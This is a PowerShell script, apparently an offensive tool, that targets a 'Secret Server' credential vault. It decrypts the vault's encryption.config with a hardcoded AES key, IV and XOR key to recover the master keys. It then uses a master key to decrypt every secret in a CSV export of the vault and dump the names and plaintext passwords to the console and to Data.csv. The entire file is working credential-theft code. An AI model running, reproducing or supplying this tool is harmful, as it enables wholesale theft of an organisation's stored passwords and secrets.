Add-Type -AssemblyName System.Security; 
 function Get-XORValue($bytes){
    $XORMagic = Convert-HexStringToByteArray "8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e"
    $XORPos = 0;
    $out = New-Object Byte[] $bytes.count

    for($i=0; $i -lt $out.count; $i++){     
        $out[$i] = $bytes[$i] -bxor $XORMagic[$XORPos]
        $XORPos++
        
        if($XORPos -gt 31){
            $XORPos = 0
        }
    }

    return $out
}

function Convert-HexStringToByteArray {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [String] $String
    )
    $String = $String.ToLower() -replace '[^a-f0-9\\\,x\-\:]','' `
                                -replace '0x|\\x|\-|,',':' `
                                -replace '^:+|:+$|x|\\',''
     
    if ($String.Length -eq 0) { ,@() ; return } 
     
    if ($String.Length -eq 1) { 
        ,@([System.Convert]::ToByte($String,16))
    }
    elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(":") -eq -1)) { 
        ,@($String -split '([a-f0-9]{2})' | foreach-object {
            if ($_) {
                [System.Convert]::ToByte($_,16)
            }
        }) 
    }
    elseif ($String.IndexOf(":") -ne -1) { 
        ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)})
    }
    else { 
        ,@()
    }
}

function Get-MasterKeysv104{
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )

    $IV = Convert-HexStringToByteArray "ad478c63f93d5201e0a1bbfff0072b6b"
    $key = Convert-HexStringToByteArray "83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088"

    $aes = New-Object "System.Security.Cryptography.AesManaged"
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.BlockSize = 128
    $aes.KeySize = 256
    $aes.Key = $key
    $aes.IV = $IV

    $bytes = [System.IO.File]::ReadAllBytes($path)
    $bytes = $bytes[41..$bytes.Length]; # Skip the ASCII file header

    $decryptor = $aes.CreateDecryptor();
    $encryptionConfig = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aes.Dispose()

    $numKeys = [System.BitConverter]::ToInt32($encryptionConfig[1..4],0) -bxor [System.BitConverter]::ToInt32($encryptionConfig[5..8],0);
    Write-Verbose "encryption.config key count: $numKeys";

    $config = @{}; 
    $encPos = 9; 

    for($i = 0; $i -lt $numKeys; $i++){
        # get the key
        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
        $len = $lengthVal -bxor $lengthXOR

        $key = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
        $keyString = [System.Text.Encoding]::Unicode.GetString($key)
        Write-Verbose "Got encryption.config key: $keyString";

        $encPos += 8+$len 
        
        # get the value
        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
        $len = $lengthVal -bxor $lengthXOR

        $value = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
        $valueString = [System.Text.Encoding]::Unicode.GetString($value)
        Write-Verbose "Got encryption.config value: $valueString";
        
        $encPos += 8+$len 

        $config.add($keyString,$valueString)
    }
    
    return $config
} 


function Invoke-SecretDecrypt 
{

    Param (
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Item,

        [Parameter( Position = 2, Mandatory = $True )]
        [String]
        $ItemIV,

        [Parameter( Position = 3, Mandatory = $True )]
        [String]
        $Key,

        [Parameter( Position = 4, Mandatory = $True )]
        [String]
        $IVMek,

        [Parameter( Mandatory = $True )]
        [String]
        $MasterKey
    )

    $key256 = Convert-HexStringToByteArray($MasterKey)
    $IVMekBytes = Convert-HexStringToByteArray($IVMek);
    $KeyBytes = Convert-HexStringToByteArray $Key
    $ItemIVBytes =  Convert-HexStringToByteArray $ItemIV
    $ItemBytes = Convert-HexStringToByteArray $Item

    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cryptoTransform = $aes.CreateDecryptor($key256, $IVMekBytes)
    $intermediateKey = $cryptoTransform.TransformFinalBlock($KeyBytes, 0, $KeyBytes.Length)
    
    $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
    Write-Verbose "Intermediate Key: $intKeyString"

    $cryptoTransform = $aes.CreateDecryptor($intermediateKey, $ItemIVBytes);
    $cleartext = [System.Text.Encoding]::Unicode.GetString($cryptoTransform.TransformFinalBlock($ItemBytes, 0, $ItemBytes.Length))
    
    return $cleartext.Substring(4);
}


function Invoke-SecretDump
{
    Param (

        [Parameter(Mandatory = $True )]
        [String] $SecretServerDataPath,

        [Parameter(Mandatory = $True )]
        [String] $MasterKey
    )
    $raw = Import-csv $SecretServerDataPath -Delimiter ","
    $collection = @()
    foreach ($entry in $raw) {
        try {
            $plain = Invoke-SecretDecrypt -MasterKey $MasterKey  -Key $entry.key.Substring(100) -IVMek $entry.key.Substring(4, 32) -Item $entry.item.Substring(100) -ItemIV $entry.item.Substring(4, 32)
            $name = $entry.SecretName
            $desc = $entry.SecretFieldName
            $temp = new-object psobject -Property @{
                Name = $name
                Description = $desc
                Decrypted = $plain
            }
            Write-Output "$name,$desc,$plain"
            $collection += $temp
        }
        catch {
            throw
        }
    } 
    $collection | Export-Csv "Data.csv" -NoTypeInformation
}
